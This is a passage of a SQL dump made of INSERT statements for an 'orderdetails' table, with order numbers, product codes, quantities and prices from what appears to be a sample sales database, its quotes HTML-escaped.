\u0026#39;56.55\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10209\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;79.67\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10209\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;90.52\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10209\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;44.20\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;112.99\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;189.79\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;141.92\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;68.43\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;51.48\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;100.67\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;63.22\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;56.64\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;68.10\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;84.91\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;57.10\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;43.20\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;87.69\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;93.74\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;98.48\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;64.00\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;60.70\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;90.92\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;171.22\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;126.52\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;79.80\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;73.17\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;138.17\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;60.30\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;148.80\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;109.32\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;62.33\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;52.66\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;80.84\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;39.83\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;94.91\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;70.78\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;99.82\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;110.55\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;117.48\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;105.77\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;64.68\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;133.72\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;117.48\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;155.79\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;115.85\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;61.73\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;43.27\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;81.78\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;37.38\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;77.91\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;100.66\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;117.96\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10213\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;84.67\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10213\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;58.44\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10213\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;97.48\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10214\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;166.60\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10214\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;53.28\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10214\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;125.86\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10214\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;167.06\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10214\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;32.19\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10214\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;39.87\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10214\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;38.57\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10215\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;205.73\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10215\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;100.34\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10215\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;92.47\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10215\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;53.91\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10215\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;97.26\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10215\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;56.21\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10215\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;89.01\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10215\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;84.33\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10215\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;42.76\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10215\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;94.47\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10216\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;133.94\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10217\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;132.97\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10217\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;58.34\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10217\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;118.66\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10217\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;103.51\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10217\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;78.97\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10217\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;56.24\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10217\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;90.02\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10218\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;110.46\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10218\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;152.41\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10219\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;94.80\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10219\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;132.62\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10219\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;31.12\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10219\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;47.62\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10220\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;189.10\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10220\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;151.08\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10220\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;166.10\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10220\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;126.39\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10220\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;48.55\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10220\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;101.72\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10220\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;49.71\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10220\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;92.60\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10220\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;56.82\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10221\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;133.86\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10221\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;89.75\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10221\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;84.26\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10221\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;113.06\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10221\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;69.29\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;133.28\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;137.19\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;79.14\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;88.93\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;56.86\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;74.35\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;61.15\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;77.99\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;55.27\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;58.67\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;80.56\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;90.75\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;69.39\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;84.14\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;81.43\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;66.63\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;45.19\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;48.59\u0026#39;, \u0026#39;18\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;80.39\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;110.61\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;189.79\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;67.58\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;58.75\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;104.81\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;87.54\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;60.94\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;68.10\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;90.90\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;66.73\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;41.02\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;84.03\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;113.90\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;79.20\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10224\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;141.58\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10224\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;57.20\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10224\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;60.26\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10224\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;37.01\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10224\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;94.91\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10224\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;81.36\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10225\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;157.60\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10225\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;101.00\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10225\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;64.64\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES 